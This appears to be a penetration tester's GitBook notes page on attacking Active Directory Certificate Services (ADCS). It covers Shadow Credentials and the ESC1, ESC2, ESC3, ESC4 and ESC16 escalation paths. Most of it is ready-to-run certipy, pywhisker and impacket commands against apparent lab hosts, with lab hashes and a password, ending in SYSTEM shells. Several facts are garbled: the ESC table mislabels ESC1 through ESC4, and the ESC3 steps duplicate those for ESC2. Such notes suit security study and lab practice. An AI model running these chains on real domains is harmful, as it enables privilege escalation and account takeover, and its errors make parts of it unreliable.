---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# ADCS

ADCS (Active Directory Certificate Services) is a Windows Server role that provides certificate-based authentication and Public Key Infrastructure (PKI) functionality in AD environments. It runs as a service and communicates over TCP `135` and dynamic RPC ports, primarily for certificate issuance and management. If Web Enrollment or related features are enabled, it may also use ports `80` and `443`.

{% hint style="info" %}
Tools like `certipy` interact with ADCS over these ports, particularly via RPC.
{% endhint %}

ADCS is like an <mark style="background-color:yellow;">internal digital ID system for a Windows domain</mark>. Instead of printing physical ID cards, it <mark style="background-color:yellow;">issues digital certificates that users and computers can use to log in</mark>, encrypt communications, or sign data. These certificates are trusted across the domain, so if an attacker can trick ADCS into giving them a certificate, it's <mark style="background-color:yellow;">similar to getting a valid employee badge</mark> — they can impersonate someone else and gain access.

## Shadow Credentials

The Shadow Credentials attack <mark style="background-color:yellow;">abuses the</mark> <mark style="background-color:yellow;"></mark><mark style="background-color:yellow;">`msDS-KeyCredentialLink`</mark> <mark style="background-color:yellow;"></mark><mark style="background-color:yellow;">attribute in AD to add a malicious authentication certificate to an account</mark> — typically a service or privileged account. This allows the attacker to <mark style="background-color:yellow;">impersonate the target account via certificate-based authentication</mark> (PKINIT), without needing their password or hash.

{% hint style="warning" %}
#### Requirements:

* The attacker **must have** `Write` **access** to the target's `msDS-KeyCredentialLink` attribute.
* ADCS must be configured to allow **certificate-based authentication (PKINIT)**.
{% endhint %}

{% tabs %}
{% tab title="certipy" %}
`certipy shadow auto` automates the shadow credentials attack by injecting a forged certificate into a target account's `msDS-KeyCredentialLink` attribute. It authenticates with provided credentials, adds the malicious credential, and requests a certificate tied to the target:

```bash
certipy shadow auto -u <user@domain> -p <pass> -account 'ca_svc' -dc-ip <dc-ip>
```

This results in the two files and a hash:

* **`.pfx`** : contains the **certificate and private key** the attacker got from the CA. It can be imported into Windows or used with tools that support PKI authentication to authenticate as the user.
* **`.ccache`**: this is a **Kerberos credential cache** file, generated after using the certificate for PKINIT (certificate-based Kerberos auth). It allows us to **authenticate with Kerberos tickets as that user** without a password or NT hash. Tools like `impacket` or `kinit` can use it to get tickets.
* **NT hash:** this is extracted from memory (via the Key Credential attack), giving us a password-equivalent credentia**l** we can use in typical NTLM-based attacks like Pass-the-Hash or SMB authentication.
{% endtab %}

{% tab title="pywhisker" %}
[`pyWhisker`](https://github.com/ShutdownRepo/pywhisker?tab=readme-ov-file) manipulates the `msDS-KeyCredentialLink` attribute to gain control over a user or computer object. It leverages Impacket and a Python version of DSInternals, working with [PKINIT tools](https://github.com/dirkjanm/PKINITtools) to enable full exploitation on Unix systems.

#### **Requirements:**

* Domain Functional Level: **Windows Server 2016+**
* At least one **DC running Windows Server 2016+**
* The DC must have a **certificate and private key** (e.g., via AD CS or PKI)
* Attacker must control an account with **write access** to `msDS-KeyCredentialLink`

> ⚠️ Without the DC's cert/key, a `KDC_ERR_PADATA_TYPE_NOSUPP (16)` error will occur during the AS-REQ process.

{% code overflow="wrap" %}
```bash
pywhisker -d '<domain>' -u '<owned-acc>' -p '<pass>' --target '<target-acc>' --action 'add' --filename <filename>
...
[*] Updating the msDS-KeyCredentialLink attribute of ca_svc
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[+] Saved PFX (#PKCS12) certificate & key at path: ca_svc.pfx
[*] Must be used with password: a3JnpFX9ZuxEXbCrPPxy
[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
```
{% endcode %}

Once the values are generated and added, a TGT can be requested ([gettgtpkinit.py](https://github.com/dirkjanm/PKINITtools/blob/master/gettgtpkinit.py)) and the NT hash can then be recovered ([getnthash.py](https://github.com/dirkjanm/PKINITtools/blob/master/getnthash.py)):

{% code overflow="wrap" %}
```bash
# Request TGT
gettgtpkinit.py -cert-pfx <pfx-file> -pfx-pass <pass> <domain>/<user> <ccache-file>

# Recover NT hash
getnthash.py -key <key> <domain>/<user>
```
{% endcode %}
{% endtab %}
{% endtabs %}

## ESC Attacks

{% hint style="info" %}
The terms **ESC1**, **ESC2**, etc., come from a **threat model and classification system** introduced by SpecterOps. These labels don’t stand for acronyms — **ESC** simply means **ESCalation** — and they’re followed by a number to identify different types of attack paths related to ADCS.
{% endhint %}

<table><thead><tr><th width="79.6666259765625">Label</th><th width="423.3333740234375">Description</th><th>Key Risk</th></tr></thead><tbody><tr><td><strong>ESC1</strong></td><td>Misconfigured template allows users to request certs for others</td><td>Identity impersonation</td></tr><tr><td><strong>ESC2</strong></td><td>Misconfigured template allows user-supplied Subject Alternative Name (SAN)</td><td>Identity impersonation</td></tr><tr><td><strong>ESC3</strong></td><td>Misconfigured template allows enrollment with client authentication and no manager approval</td><td>Template abuse</td></tr><tr><td><strong>ESC4</strong></td><td>Control over <code>Cert Publisher</code> user lets attacker modify templates</td><td>Template abuse</td></tr><tr><td><strong>ESC16</strong></td><td>Certificate Authority (CA) has Security Extensions disabled, allowing unauthorized certificate issuance</td><td>Identity impersonation</td></tr></tbody></table>

{% hint style="danger" %}
This **ESC4 → ESC1** chain is especially dangerous as it **leverages legitimate ADCS functionality**, making detection difficult. Issued certificates may remain valid for years, providing **long-term persistence** unless explicitly revoked. For an example of this attack chain see [EscapeTwo](https://x7331.gitbook.io/boxes/boxes/easy/escapetwo#privilege-escalation).
{% endhint %}

The first step in all ESC attacks is to **identify a vulnerable template**:

{% hint style="success" %}
A NT hash can be also used with the `-hashes <NT-hash` option.
{% endhint %}

{% code overflow="wrap" %}
```bash
# Test for vulnerable templates
$ certipy find -u <user>@<domain> -p <pass> -stdout -vuln
...
    [!] Vulnerabilities
      ESC1  : '<domain>\\Domain Users' can enroll, enrollee supplies subject and template allows client authentication
      ESC2  : '<domain>\\Domain Users' can enroll and template can be used for any purpose
      ESC3  : '<domain>\\Domain Users' can enroll and template has Certificate Request Agent EKU set
      ESC4  : User has dangerous permissions.
      ESC16 : Security Extension is disabled.               
```
{% endcode %}

### Identity Hijack (ESC1)

{% hint style="success" %}
Certipy's [documentation](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc1-enrollee-supplied-subject-for-client-authentication) for ESC1.
{% endhint %}

ESC1 is a <mark style="background-color:yellow;">certificate template misconfiguration where low-privileged users can request certificates and specify arbitrary identities in the Subject Alternative Name (SAN) field</mark>. This occurs when the template has `Supply in the request` enabled, allows client authentication (e.g., via the `Client Authentication` EKU), and grants enrollment rights to broad groups like `Domain Users`, without enforcing additional controls such as manager approval or authorized signatures. As a result, an attacker can request a certificate containing an administrator's UPN or SID, and then use it to authenticate as that user via PKINIT or other certificate-based authentication methods.

{% tabs %}
{% tab title="1. Request Certificate" %}
{% code overflow="wrap" %}
```bash
# Request a certificate for the Administrator account
$ certipy req -u ca_svc@sequel.htb -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -ca sequel-DC01-CA -template DunderMifflinAuthentication -upn administrator@sequel.htb -target dc01.sequel.htb -target-ip 10.10.11.51
...
[*] Wrote certificate and private key to 'administrator.pfx'
```
{% endcode %}
{% endtab %}

{% tab title="2. Authenticate" %}
{% code overflow="wrap" %}
```bash
# Authenticate as the administrator using the PFX file
$ certipy auth -pfx administrator.pfx -dc-ip 10.10.11.51
Certipy v5.0.2 - by Oliver Lyak (ly4k)
...
[*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:7a8d4e04986afa8ed4060f75e5a0b3ff
```
{% endcode %}
{% endtab %}

{% tab title="3. Impersonate" %}
We can then use `impacket-psexec` to get a `SYSTEM` shell:

```bash
$ impacket-psexec administrator@<dc-ip> -hashes :<NT-hash>
```

We can also export and use the TGT ticket (`administrator.ccache`):

```bash
$ export KRB5CCNAME=administrator.ccache
$ impacket-psexec administrator@<domain> -k -no-pass
```
{% endtab %}
{% endtabs %}

### Identity Hijack (ESC2)

{% hint style="success" %}
Certipy's [documentation](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc2-any-purpose-certificate-template) for ESC2.
{% endhint %}

ESC2 is an <mark style="background-color:yellow;">ADCS misconfiguration</mark> where a certificate template is configured with the `Any Purpose` Enhanced Key Usage (EKU) or no EKU at all, <mark style="background-color:yellow;">allowing the certificate to be used for any operation, including acting as an Enrollment Agent</mark>. If low-privileged users have enrollment rights for such a template, they can request a certificate that implicitly grants the ability to request certificates on behalf of other users. Combined with a target template that allows enrollment agent requests (e.g., the default `User` or `Machine` templates), an attacker can use their `Any Purpose` certificate to impersonate a high-privileged user like a `Domain Admin`. This allows privilege escalation through indirect impersonation, exploiting the CA’s implicit trust in the agent capabilities of the attacker’s certificate.

{% tabs %}
{% tab title="1. Any Cert" %}
Request an any purpose certificate:

{% hint style="warning" %}
In this step, we use the vulnerable template's name.
{% endhint %}

{% code overflow="wrap" %}
```bash
certipy req -ca <ca-name> -dc-ip <dc-ip> -u <user>@<domain> -p <pass> -template <vulnerable-to-ESC2-template-name> -target <domain-fqdn>
```
{% endcode %}
{% endtab %}

{% tab title="2. Admin Cert" %}
Request a certificate on behalf of the `Domain Admin`:

{% hint style="warning" %}
In this step, we can use a built-in template, such as `USER`, that allows certificate enrollment for regular users.
{% endhint %}

{% code overflow="wrap" %}
```bash
certipy req -ca SHIELD-DC4-CA -dc-ip <dc-ip> -u <user>@<domain> -p <pass> -template <template-name> -target <domain-fqdn> -on-behalf-of '<domain>\administrator' -pfx <pfx-file>
```
{% endcode %}
{% endtab %}

{% tab title="3. Auth" %}
Get the TGT and/or NT hash:

```bash
certipy auth -pfx administrator.pfx
```
{% endtab %}

{% tab title="4. Impersonate" %}
Get a `SYSTEM` shell:

```bash
impacket-smbexec administrator@<domain-fqdn> -hashes :<NT-hash>
```

or use the TGT:

```bash
$ export KRB5CCNAME=administrator.ccache
$ impacket-psexec administrator@<domain-fqdn> -k -no-pass
```
{% endtab %}
{% endtabs %}

### Template Abuse (ESC3)

{% hint style="success" %}
Certipy's [documentation](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc3-enrollment-agent-certificate-template) for ESC3.
{% endhint %}

{% hint style="warning" %}
ESC2 vs ESC3

* **ESC2**: Template allows **any purpose** usage + lacks protections (like no approval or manager check)
* **ESC3**: Template has **Certificate Request Agent** EKU and lacks approval
{% endhint %}

ESC3 is a vulnerability where a <mark style="background-color:yellow;">misconfigured certificate template allows users to obtain Enrollment Agent certificates, which can be used to request certificates on behalf of other users</mark>. If the attacker can enroll for such a certificate—either directly or via an `Any Purpose` template (ESC2)—and a second template allows agent-based enrollment (often the case with default templates like `User` or `Machine`), the attacker can impersonate privileged users like `Domain Admins` by obtaining certificates in their name, leading to privilege escalation.

{% tabs %}
{% tab title="1. Any Cert" %}
Request an any purpose certificate:

{% hint style="warning" %}
In this step, we use the vulnerable template's name.
{% endhint %}

{% code overflow="wrap" %}
```bash
certipy req -ca <ca-name> -dc-ip <dc-ip> -u <user>@<domain> -p <pass> -template <vulnerable-to-ESC2-template-name> -target <domain-fqdn>
```
{% endcode %}
{% endtab %}

{% tab title="2. Admin Cert" %}
Request a certificate on behalf of the `Domain Admin`:

{% hint style="warning" %}
In this step, we can use a built-in template, such as `USER`, that allows certificate enrollment for regular users.
{% endhint %}

{% code overflow="wrap" %}
```bash
certipy req -ca SHIELD-DC4-CA -dc-ip <dc-ip> -u <user>@<domain> -p <pass> -template <template-name> -target <domain-fqdn> -on-behalf-of '<domain>\administrator' -pfx <pfx-file>
```
{% endcode %}
{% endtab %}

{% tab title="3. Auth" %}
Get the TGT and/or NT hash:

```bash
certipy auth -pfx administrator.pfx
```
{% endtab %}

{% tab title="4. Impersonate" %}
Gain a `SYSTEM` shell:

```bash
impacket-smbexec administrator@<domain-fqdn> -hashes :<NT-hash>
```

or use the TGT:

```bash
$ export KRB5CCNAME=administrator.ccache
$ impacket-psexec administrator@<domain-fqdn> -k -no-pass
```
{% endtab %}
{% endtabs %}

### Template Abuse (ESC4)

{% hint style="success" %}
Certipy's [documentation](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc4-template-hijacking) for ESC4.
{% endhint %}

**ESC4** is a misconfiguration where <mark style="background-color:yellow;">a low-privileged user can take control of another account — typically a member of the</mark> <mark style="background-color:yellow;"></mark><mark style="background-color:yellow;">`Cert Publishers`</mark> <mark style="background-color:yellow;"></mark><mark style="background-color:yellow;">group</mark>. Since `Cert Publishers` can modify certificate templates, gaining control of such an account lets an attacker <mark style="background-color:yellow;">edit a template to make it vulnerable to</mark> <mark style="background-color:yellow;"></mark><mark style="background-color:yellow;">**ESC1**</mark>. This means weakening the template's settings to allow certificate requests without proper validation or approval, enabling certificate-based impersonation of privileged users.

{% code overflow="wrap" %}
```bash
# Make the template vulnerable to ESC1
$ certipy template -u ca_svc@sequel.htb -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -template DunderMifflinAuthentication -write-default-configuration
...
[*] Successfully updated 'DunderMifflinAuthentication'
```
{% endcode %}

### Identity Hijack (ESC16)

{% hint style="success" %}
Certipy's [documentation](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally) for ESC16.
{% endhint %}

**ESC16** occurs when a <mark style="background-color:yellow;">CA is misconfigured to exclude a critical SID extension from all issued certificates</mark>. This weakens certificate-based authentication by <mark style="background-color:yellow;">forcing DCs to fall back on insecure mappings like UPN or DNS names</mark>. If the domain isn't in full enforcement mode, attackers can impersonate privileged users by abusing certificate templates — even without strong SID bindings. This can happen either due to a registry setting or because the CA is unpatched (missing the May 2022 security update). ESC16 can also be combined with ESC6 to fully bypass SID validation, even in stricter environments.

{% tabs %}
{% tab title="1. Read" %}
Read initial UPN of the victim account for restoration purposes:

{% code overflow="wrap" %}
```bash
$ uv run certipy account -u <user> -p <pass> -dc-ip <dc-ip> -user 'ca_svc' read
...
   userPrincipalName                   : ca_svc@fluffy.htb
```
{% endcode %}
{% endtab %}

{% tab title="2. Update" %}
Update the victim account's UPN to the target 's `sAMAccountName`:

{% code overflow="wrap" %}
```bash
$ uv run certipy account -u <user> -p <pass> -dc-ip <dc-ip> -upn 'administrator' -user 'ca_svc' update
...
[*] Updating user 'ca_svc':
    userPrincipalName                   : administrator
[*] Successfully updated 'ca_svc'
```
{% endcode %}
{% endtab %}

{% tab title="3. Shadow Creds" %}
Obtain credentials for the "victim" account (e.g., via Shadow Credentials):

{% code overflow="wrap" %}
```bash
$ uv run certipy shadow auto -u p.agila@fluffy.htb -p prometheusx-303 -dc-ip 10.10.11.69 -account 'ca_svc'
...
[*] Wrote credential cache to 'ca_svc.ccache' # TGT
[*] NT hash for 'ca_svc': ca0...8c8 # NT hash
```
{% endcode %}
{% endtab %}

{% tab title="3. Request" %}
Request a certificate as the "victim" user from any suitable client authentication template (e.g., "User") on the ESC16-vulnerable CA:

{% hint style="warning" %}
* `-target`: The **DNS hostname** of the server running the CA.
* `-ca`: The **CA name**, usually in the format `<domain>-<hostname>-CA`.
{% endhint %}

{% code overflow="wrap" %}
```bash
# Export the TGT
$ export KRB5CCNAME=victim.ccache

$ uv run certipy req -k -dc-ip <dc-ip> -target 'dc01.fluffy.htb' -ca 'fluffy-DC01-CA' -template 'User'
...
[*] Wrote certificate and private key to 'administrator.pfx'
```
{% endcode %}
{% endtab %}

{% tab title="4. Revert" %}
Revert the "victim" account's UPN:

{% code overflow="wrap" %}
```bash
$ uv run certipy account -u <user> -p <pass> -dc-ip <dc-ip> -upn '<upn>' -user 'ca_svc' update
...
[*] Updating user 'ca_svc':
    userPrincipalName                   : cva_svc@fluffy.htb
[*] Successfully updated 'ca_svc'
```
{% endcode %}
{% endtab %}

{% tab title="5. Auth" %}
Authenticate as the target administrator:

{% code overflow="wrap" %}
```bash
$ uv run certipy auth -dc-ip <dc-ip> -pfx administrator.pfx -username 'administrator' -domain 'fluffy.htb'
...
[*] Wrote credential cache to 'administrator.ccache' # TGT
[*] Got hash for 'administrator@fluffy.htb': aad...a6e # NTLM hash
```
{% endcode %}
{% endtab %}
{% endtabs %}

## Resources

* SpecterOps _Certified Pre-Owned (2021)_ whitepaper ([article](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf))
* RBT's short articles and video walkthrough about the ESCs attacks ([ESC1](https://www.rbtsec.com/blog/active-directory-certificate-services-adcs-esc1/), [ESC2](https://www.rbtsec.com/blog/active-directory-certificate-services-adcs-esc2/), [ESC3](https://www.rbtsec.com/blog/active-directory-certificate-services-adcs-esc3/), [ESC4](https://www.rbtsec.com/blog/active-directory-certificate-services-adcs-esc4/))
